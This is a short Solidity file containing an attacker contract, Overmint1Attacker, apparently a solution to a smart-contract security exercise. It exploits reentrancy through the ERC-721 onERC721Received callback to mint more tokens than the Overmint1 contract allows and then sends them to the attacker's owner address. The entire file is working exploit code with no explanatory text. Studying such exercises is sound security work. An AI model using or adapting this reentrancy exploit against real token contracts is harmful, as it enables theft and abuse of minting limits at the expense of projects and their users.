// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.15;

import "./Overmint1.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1Attacker is IERC721Receiver, Ownable {
    Overmint1 public victim;

    constructor(Overmint1 target)  {
        victim = target;
        victim.setApprovalForAll(owner(), true);
    }

    function attack() external {
        victim.mint();
        for (uint256 i = 0; i < 5; i++) {
            victim.transferFrom(address(this), owner(), i + 1);
        }
      }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (victim.balanceOf(address(this)) < 5) {
            victim.mint();
        }
        return this.onERC721Received.selector;
    }

}
